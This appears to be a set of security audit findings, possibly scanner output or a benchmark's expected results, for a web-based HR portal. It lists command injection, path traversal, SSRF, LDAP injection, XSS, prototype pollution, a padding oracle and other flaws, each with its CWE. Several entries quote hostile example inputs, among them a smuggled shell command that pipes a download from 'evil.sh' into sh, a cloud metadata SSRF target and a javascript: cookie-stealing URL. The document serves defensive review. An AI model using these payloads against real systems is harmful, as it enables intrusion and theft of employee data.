extra.message: The employee export format (formData field 'exportFormat', read at line 459) is interpolated directly into a shell command string that is executed with spawn(cmd, [], { shell: true }). An attacker (any hr_admin/payroll_specialist) can supply a value like 'xlsx; curl http://evil.sh | sh' to achieve arbitrary OS command execution as the server process. The sibling function convertOnboardingExport (lines 74-97) correctly uses an allowlist and shell:false.

extra.message: saveComplianceSnapshot builds the destination path with path.join(COMPLIANCE_ARCHIVE_DIR, `${batchLabel}.csv`) where batchLabel comes verbatim from the attacker-controlled 'x-archive-label' request header (line 444) with no sanitization. A label such as '../../public/uploads/evil' writes the exported CSV (containing all employee PII) to an arbitrary location on the filesystem, allowing arbitrary file write/overwrite. Contrast writePolicyLedgerSnapshot in policies.tsx which correctly applies path.basename plus character whitelisting.

extra.message: saveEmployeePortrait writes an uploaded file to path.join(avatarsDir, `${employeeId}-${file.name}`) where file.name is the client-controlled multipart filename with no sanitization, MIME validation, or size limit. A filename containing '../' sequences (e.g. '../../../app/foo') escapes public/avatars and lets any authenticated employee overwrite arbitrary files with attacker-controlled content. Contrast saveEmployeeIdBadgePhoto in employees.$id.edit.tsx which validates MIME type, enforces a size cap, and uses a crypto.randomUUID filename outside the public root.

cwe: CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')

extra.message: syncPolicyFromSourceDocument fetches the URL supplied in the attacker-controlled 'x-policy-source-url' header with no host allowlist or scheme restriction. An attacker can point the server at internal endpoints (e.g. http://169.254.169.254/latest/meta-data/, internal admin services, http://localhost) and the first 5000 bytes of the response are returned to the caller, enabling full read SSRF. Contrast fetchCompensationBenchmarkDocument in payroll-provider.server.ts which validates the hostname against an approved vendor allowlist.

cwe: CWE-918: Server-Side Request Forgery (SSRF)

extra.message: searchStaffDirectory interpolates the raw searchTerm into the LDAP filter `(cn=*${searchTerm}*)` without escaping. The value flows from the 'name' query parameter in staff-directory-search.tsx (line 15-17). An attacker can inject LDAP metacharacters like ')(objectClass=*)' to alter the filter and enumerate the corporate directory. The file even exports escapeLdapFilter (RFC 4515 escaping) and uses it in verifyBenefitsGroupMembership (line 76-77), but this function does not apply it.

cwe: CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')

extra.message: renderTaskReminderNote compiles a user-supplied template: Handlebars.compile(formData.get('noteTemplate')) with no template restrictions. Compiling attacker-controlled Handlebars templates enables server-side template injection; known Handlebars payloads (e.g. via constructor/lookup chains) can achieve prototype pollution or remote code execution on the server. Contrast renderAcknowledgementReminder in policies.tsx which only compiles a fixed, trusted template string.

cwe: CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine

extra.message: The compensation loader reflects the request's Origin header verbatim into 'Access-Control-Allow-Origin' and also sets 'Access-Control-Allow-Credentials: true'. Any malicious website can therefore make an authenticated cross-origin request to /compensation and read the full response (all salary/bonus compensation records for the logged-in manager or HR admin) via the victim's session cookie.

cwe: CWE-942: Permissive Cross-domain Policy with Untrusted Domains

extra.message: The profile loader returns allEmployees = db.query.employees.findMany({ with: { user: true } }) to any authenticated employee. This exposes every employee row — including home address, phone, date of birth, emergency contact, taxId, and hrNotes columns — in the serialized loader JSON for the /profile page, even though the UI never uses this data. Any employee can read every coworker's sensitive personal data from the page payload.

cwe: CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

extra.message: Employee documents (contracts, tax forms, payslips, identification) are written to public/uploads and served by the static file server with no authentication or role checks, even for records with isVisibleToEmployee=false. The UI links directly to href={doc.filePath}, bypassing the access-controlled API route (api.documents.$id.download.tsx) that enforces visibility and direct-report rules. Anyone who can guess or obtain a file URL (files are served to unauthenticated requests at /uploads/<uuid>.<ext>) can download sensitive HR documents.

cwe: CWE-306: Missing Authentication for Critical Function
CWE-538: File and Directory Information Exposure

extra.message: The session cookie signing secret falls back to the hard-coded value 'default-secret-change-me' when SESSION_SECRET is not set. If deployed without the environment variable, any attacker can forge valid signed session cookies (choosing arbitrary userId/role, e.g. hr_admin), resulting in complete authentication bypass. The committed .env also contains a weak, predictable value for this secret.

cwe: CWE-798: Use of Hard-coded Credentials

extra.message: The 'redirectTo' form field is taken verbatim from user input and passed to createUserSession, which issues redirect(redirectTo) (auth.server.ts:95) with no validation that it is a same-site relative path. An attacker can craft a login form posting redirectTo='https://evil.com' to redirect authenticated users to an attacker-controlled site after login (open redirect useful for credential phishing).

extra.message: closeHrRequestWithReason redirects to the raw value of the attacker-controlled 'X-Return-To' header with no validation or allowlist. A manager/HR admin request carrying 'X-Return-To: https://evil.com' produces an open redirect to an arbitrary external site. extra.message: applyNotificationDeliveryPrefs merges a JSON blob parsed from the attacker-controlled 'x-notification-prefs' header into a live module-level config object via Object.assign(notificationDeliveryConfig, parsed) with no key filtering. A payload containing '__proto__' or 'constructor' keys mutates the object's prototype chain (JSON.parse creates an own __proto__ property that Object.assign passes through the __proto__ setter). Contrast applyDepartmentDigestPrefs (lines 121-135) which copies only allowlisted fields and explicitly rejects dunder keys.

cwe: CWE-1321: Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution')

extra.message: resumeOnboardingProgress decrypts an AES-256-CBC token (with no integrity protection) and surfaces distinct error types: a 'bad decrypt' failure throws 'invalid_padding' while other failures throw 'decryption_failed'. The route (onboarding.tsx:326-328) converts these into different client-visible messages. This differentiated oracle lets an attacker submit modified ciphertexts and learn, one byte at a time, whether a block decrypts to valid PKCS#7 padding, enabling full decryption of any intercepted resume token. Contrast resumeBenefitsElectionProgress (lines 78-97) which uses AES-GCM and a single undifferentiated error.

cwe: CWE-310: Cryptographic Issues

extra.message: issueOnboardingVerificationCode generates the 6-digit remote onboarding verification code with Math.floor(Math.random() * 1000000), a non-cryptographic PRNG whose output is predictable. Security-relevant tokens must use crypto.randomBytes/crypto.getRandomValues (as done in integrationKeys.server.ts:11). Predictable codes allow an attacker to guess the verification code for a new hire's remote onboarding session.

cwe: CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)

extra.message: Task evidence URLs submitted by employees (formData 'evidence_url', stored at line 615) are rendered as <a href={task.evidenceUrl} target='_blank'> without scheme validation. React does not sanitize javascript: URLs, so an employee can submit 'javascript:alert(document.cookie)' as evidence; when a manager or HR admin clicks the link, script executes in the portal origin (stored XSS), allowing session theft or actions as the victim.

cwe: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

extra.message: restoreEmployeeProfileDraft spreads an uploaded JSON document ({ ...draft }) directly into db.update(employees).set() with no column allowlist, so the draft's shape decides which database columns are written. A malicious 'restore_draft' upload can overwrite arbitrary employees columns such as userId (re-linking the record to a different account), managerId, taxId, or isSensitiveInfoReviewed. Contrast handleImportTaskTemplate and toPolicyImportPayload which validate each field individually before writing.

cwe: CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes

extra.message: The 'confirmationPasses' form field is user-controlled and passed to registerKioskPin, which uses it directly as the bcrypt cost factor: bcrypt.hash(pin, confirmationPasses || 4) (kiosk-session.server.ts:20). An attacker can submit a huge value (e.g. 1e9) to force the server into an extremely expensive bcrypt computation, exhausting CPU (denial of service), or a value of 1 to weaken the PIN hash. The cost factor must be a server-side constant.

cwe: CWE-400: Uncontrolled Resource Consumption

extra.message: When 'report_mode=full' is supplied as a query parameter, buildAuditLogErrorResponse throws a JSON response containing error.message, error.stack, and the applied filters. extra.message: grantShiftCoveragePass sets the 'coverage_pass' cookie — a bearer credential that carries the manager's identity for supervisor overrides — via a raw Set-Cookie string with Path=/ and Max-Age but without HttpOnly, Secure, or SameSite attributes. extra.message: The session cookie is configured with sameSite: 'none' and the application implements no CSRF tokens or origin checks on any state-changing action.
